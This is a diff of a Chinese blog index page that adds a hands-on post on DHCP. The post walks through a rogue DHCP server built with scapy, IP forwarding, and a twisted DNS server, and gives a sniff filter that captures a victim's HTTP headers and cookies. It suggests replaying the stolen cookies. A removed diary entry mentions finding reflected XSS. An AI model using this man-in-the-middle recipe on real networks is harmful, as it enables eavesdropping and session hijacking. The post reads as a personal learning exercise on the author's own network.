@@ -224,6 +224,148 @@
             
               
                 
+                <a class="post-title-link" href="/network/2014/03/07/play-dhcp/" itemprop="url">
+                  Playing and Learning DHCP in Action
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-03-07T00:00:00+08:00" content="2014-03-07">
+              2014-03-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/network/" itemprop="url" rel="index">
+                    <span itemprop="name">network</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/network/2014/03/07/play-dhcp/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/07/play-dhcp/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <h2 id="实验准备">实验准备</h2><ul>
+<li>scapy：用来伪造dhcp/dns服务器，抓包(调用tcpdump)</li>
+<li>tcpdump/wireshark：来观察网络流量。</li>
+<li>twisted来建立dns服务器</li>
+<li>某个测试机器和某路由无线网络</li>
+</ul>
+<h2 id="一点DHCP协议基础">一点DHCP协议基础</h2><p>DHCP是，是干啥的呢？简单来说是为了自动化为网络中的主机配置各种配置，包括ip地址，网关，域名服务器等等。</p>
+<p>有篇不错的<a href="http://jeffyyko.blog.51cto.com/28563/163168" target="_blank" rel="external">中文教程</a>带你回顾整个dhcp服务过程，然而，事情不总是这样的。比如linux和安卓一般默认就没有arping检查重复ip的过程。</p>
+<h2 id="Rogue_DHCP_Server">Rogue DHCP Server</h2><p>流氓服务器，指非法在网络中提供dhcp服务的机器。由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。</p>
+<h2 id="一次中间人攻击">一次中间人攻击</h2><p>我们试着搭建一个流氓dhcp服务器来指向错误的网关和dns(即我们自己)。</p>
+<p>本机的ip地址是<code>192.168.1.101</code>，这是无线路由中dhcp服务器分配的。为了让实验一定成功，最好干脆把无线路由的dhcp功能关掉，自己手动配置地址<code>192.168.1.101</code>，然后搭建个dhcp服务器。</p>
+<p>首先，确认设置ip转发功能：</p>
+<pre><code>gentoo ~ <span class="preprocessor"># echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span>
+</code></pre><p>首先，用scapy搭建一个dhcp服务器，把网关指向自己。scapy中<code>DHCP_am</code>的设计就是把<code>nameserver</code>也指向网关，可参考源代码。</p>
+<pre><code><span class="prompt">&gt;&gt;</span>&gt; dhcp_server= <span class="constant">DHCP_am</span>()
+<span class="prompt">&gt;&gt;</span>&gt; dhcp_server.gw=<span class="string">'192.168.1.101'</span>
+<span class="prompt">&gt;&gt;</span>&gt; dhcp_server()
+</code></pre><p>监听观察，发现默认网关的dhcp服务器竟然给了一个<code>dhcpnak</code>：</p>
+<pre><code> ~ ⮀ sudo tcpdump -<span class="tag">i</span> wlan0 port <span class="number">67</span> or port <span class="number">68</span> 
+tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
+listening on wlan0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
+<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.634526</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">302</span>
+<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.681009</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
+<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.688288</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">314</span>
+<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.781062</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
+<span class="number">23</span>:<span class="number">18</span>:<span class="number">56.124282</span> IP <span class="number">192.168</span>.<span class="number">1.1</span><span class="class">.bootps</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">548</span>
+</code></pre><p>用twisted建立一个DNS服务器[^1]：</p>
+<pre><code><span class="comment">sudo</span> <span class="comment">twistd</span> <span class="literal">-</span><span class="comment">n</span> <span class="comment">dns</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">recursive</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">cache</span>
+</code></pre><p>在scapy中开始中间人攻击(窃听)，比如窃听http头：</p>
+<pre><code>pkts = sniff(filter=<span class="string">"(tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)) and host 192.168.1.128 and (not host 192.168.1.1)"</span>,iface=<span class="string">"wlan0"</span>, prn=lambda <span class="keyword">x</span>: <span class="keyword">x</span>.<span class="keyword">sprintf</span>(<span class="string">"{IP:<span class="variable">%IP</span>.src% -&gt; <span class="variable">%IP</span>.dst<span class="variable">%\</span>n}{Raw:<span class="variable">%Raw</span>.load<span class="variable">%\</span>n}"</span>))
+<span class="number">192.168</span>.<span class="number">1.128</span> -&gt; <span class="number">123.125</span>.<span class="number">70.102</span>
+<span class="string">'GET /tongji/anchor?type=webapp_pv&amp;t=1394205309005&amp;page=carousel HTTP/1.1\r\nHost: wk.baidu.com\r\nAccept-Encod此处略去具体信息'</span>
+</code></pre><p>搞到cookie后尽情发挥吧，可以用temper data这种东西在火狐里试下。当然，cookie可以在各种地方比如requests啊selenium里啊使用。</p>
+<p>完工。其实后来实验时无线路由dhcp服务器被选中了，然后我的rogue dhcp server就一直处于无用状态。</p>
+<p>FIXME：可以尝试一个dhcprelease来试着解除租约，可能涉及xid或transaction ID这些东西的监听和伪造。也许会在查阅更多资料后尝试，也许。</p>
+<p>Update：以下这个链接做了这些，不过，它怎么获得xid(transaction id)的不是很明白，要赶在dhcp client的dhcprequest发出之后dhcp server返回dhcpack之前向dhcp client注入dhcpnak，好像得在开始建立连接的时候就开始监听，获取transaction id，直接就伪装成dhcp服务器想客户端发送dhcpnak。</p>
+<ul>
+<li><a href="http://www.backtrack-linux.org/forums/showthread.php?t=25132" target="_blank" rel="external">http://www.backtrack-linux.org/forums/showthread.php?t=25132</a></li>
+</ul>
+<p>[^1]: 最开始我用scapy来建立dns服务器： <code>dns_spoof()</code>.关于用scapy做DNS转发服务器，参见PacketGeek上scapy的教程<a href="http://thepacketgeek.com/scapy-p-09-scapy-and-dns/" target="_blank" rel="external">Scapy and DNS</a></p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/network/2014/03/04/play-arp/" itemprop="url">
                   Playing and Learning ARP in Action
                 </a>
@@ -2756,149 +2898,12 @@ fail:
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/reviews/2013/11/25/cloud-atlas/" itemprop="url">
-                  白驹过隙十一月
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2013-11-25T00:00:00+08:00" content="2013-11-25">
-              2013-11-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/reviews/" itemprop="url" rel="index">
-                    <span itemprop="name">reviews</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/reviews/2013/11/25/cloud-atlas/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="reviews/2013/11/25/cloud-atlas/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <blockquote>
-<p>我们的生命不仅属于自己。从生到死，我们和其他人相连，无论前世，还是今生。我们的每一个罪行，每一个善举，孕育了我们的未来。</p>
-<p>——电影”云图”中的”启示”</p>
-</blockquote>
-<p>怎么说呢,到现在为止,已经是2013年12月5号凌晨了。这篇观后感就这么积压着，也失去了<br>当年写影评的初心，直到今日完全想写些其它东西，还是想把它写完。</p>
-<p>随便记下我的十一月，越来越懒得记，时间过得越来越快，好像明天就要从bupt滚蛋毕业似的，却什么也来不及抓住</p>
-<p>总之，最近一个月迷迷糊糊就过去了，生活好像一下封闭了很多。</p>
-<p>十号,<br>中午研会羽毛球集训，很欢乐地玩到两点。在qzone上听说tt要徒步去卢沟桥，大好天气。<br>怎能错过，几经便约在北京西站一起南下，晚上终于去宛平城打了酱油，意外发现大瓦窑地铁站在附近<br>于是坐上只有六站左右的空荡荡的京港地铁14号线几经转车回到北理。</p>
-<p>十一号，<br>周一，上班，逃课闲逛，东门外的马路，学校里的黄叶呼呼拉拉地开始落了满地，甚是美丽.</p>
-<p>十四号，<br>又是天朗气清的好日子，第一次走西门-西土城-牡丹园-健德门-北土城-奥林匹克公园-奥林匹克森林公园的徒步线路。<br>广场开阔的怡人，广场上的银杏黄的醉人，奥园里红黄交错的初冬镜像也如此迷人。在奥园赏过落日天黑才坐地铁回，冷得要死。</p>
-<p>十六号，<br>研会去朝阳区青年路附近做饭，一群人桌游、做饭、看电视。第一次玩狼人杀，给去超市买东西的同志们跪了，我们去买菜啥的就花了260,超市竟然搞了一千三。。。<br>晚上回去就十点多了。</p>
-<p>十七号，<br>大好天气。临时起意找tt，穿后海西海、到景山看故宫，最后天安门回北理。景山顶人山人海，一堆拿着大炮筒照相的。</p>
-<p>二十一号，<br>天气好到无法自拔，助管倒没啥事了，又沿着之前去奥园的路走到北土城，有的河都结冰了。</p>
-<p>二十二号，<br>记得晚上游泳了，满脑子都是助管老师借证件的事。</p>
-<p>二十三号，<br>游园会给Google<br>Camp演360浏览器，看摊。临走会长给了盒橡皮泥。当时就想捏成之前gdg会长帮拿的安卓小人。</p>
-<p>二十四，大概天气不好，tt回家，看了一下午云图。</p>
-<p>二十五，我只知道天气再好不过，完全不记得做了什么。大概公司来了俩新员工。<br>对了，下午旷课去元大都遗址公园，莫名进入中心年会场务，晚上音响的职责就给我了。</p>
-<p>二十六，中午休息时把安卓小人捏出来了。</p>
-<p>二十八，<br>助管竟然最近清闲下来了，闲到我在那看近世代数课件。又走了半程奥园线。有个整理文档的任务几乎是推给一起助管的人做了。<br>两个电话竟然我考虑了这么久= =</p>
-<p>二十九天气又好得不行，三十号唯一做的有意义的事就是去游泳，然后下午很不情愿的无偿加班。工作永远做不完，直到你把所有人的工作都做完。然后就十二月了</p>
-<p>十二月</p>
-<p>一号，<br>竟然开始看legal high。晚上去参加gdg的零基础学安卓，去的晚+人太多，结果就是混了两件T-shirt回来，一个gdg的一个eoe的。</p>
-<p>二号，<br>R的课程差点错过分组。大概一月六号做演示。</p>
-<p>三号，<br>白天上班晚上电话会议，电话会议已经发展到两天一次的地步，还都晚上还没加班费，呵呵了就。网络还奇葩到一下午连不了，听说要搬地方了还有点小期待。</p>
-<p>四号，<br>上课，逛北师，被喊去改代码。看legal high，大概就这节奏</p>
-<p>光阴过隙，只能相信，所做所为在他人影响下也必在影响他人。</p>
-<p>还有几件事：</p>
-<ol>
-<li>有阵子非常热衷于xss，学习了不少xss、浏览器、js的知识,乌云知识库，pkav的教程，browser<br>security handbook，还有想等着学校图书馆赶紧买的web之困。<br>顺便发现图书馆太好xss了，蛋蛋网竟然也找到个反射xss。</li>
-<li>还在看dive into html5, 今晚到video那章了</li>
-<li>还在弹吉他,换换A掉和弦还行</li>
-<li>还是一周三次游泳，千米无压力了</li>
-<li>热衷于用夹子拼装各种东西。连成锁链，做铁塔等等。</li>
-<li>也许应该加起床协会，人总是会遗憾没经历的事。庐山烟雨浙江潮。该睡了。</li>
-</ol>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2939,7 +2944,7 @@ fail:
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">170</span>
+              <span class="site-state-item-count">171</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
